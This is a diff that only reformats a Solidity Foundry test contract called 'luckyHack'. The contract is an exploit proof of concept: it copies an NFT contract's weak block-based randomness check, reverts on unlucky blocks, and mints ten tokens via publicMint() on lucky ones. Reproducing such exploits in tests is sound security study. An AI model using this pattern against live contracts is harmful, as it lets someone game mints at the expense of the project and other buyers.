@@ -12,10 +12,13 @@ import "forge-std/Test.sol";
 */
 
 interface NFT {
+
     function balanceOf(address _owner) external view returns (uint256 balance);
+
 }
 
 contract luckyHack is Test {
+
     event Log(string);
 
     address owner = address(this);
@@ -28,25 +31,14 @@ contract luckyHack is Test {
     }
 
     function getRandom() public view returns (uint256) {
-        if (
-            uint256(
-                keccak256(abi.encodePacked(block.difficulty, block.timestamp))
-            ) %
-                2 ==
-            0
-        ) {
+        if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) {
             return 0;
         } else {
             return 1;
         }
     }
 
-    function onERC721Received(
-        address,
-        address,
-        uint256,
-        bytes memory
-    ) public pure returns (bytes4) {
+    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {
         return this.onERC721Received.selector;
     }
 
@@ -56,19 +48,13 @@ contract luckyHack is Test {
 
         uint256 amount = 10;
 
-        if (
-            uint256(
-                keccak256(abi.encodePacked(block.difficulty, block.timestamp))
-            ) %
-                2 ==
-            0
-        ) {
+        if (uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))) % 2 == 0) {
             revert("Not lucky");
         }
         bytes memory data = abi.encodeWithSignature("publicMint()");
 
         for (uint256 i = 0; i < amount; ++i) {
-            (bool status, ) = address(nftAddress).call{value: 0.01 ether}(data);
+            (bool status,) = address(nftAddress).call{value: 0.01 ether}(data);
             if (!status) {
                 revert("error");
             } else {
@@ -84,4 +70,5 @@ contract luckyHack is Test {
     }
 
     receive() external payable {}
+
 }
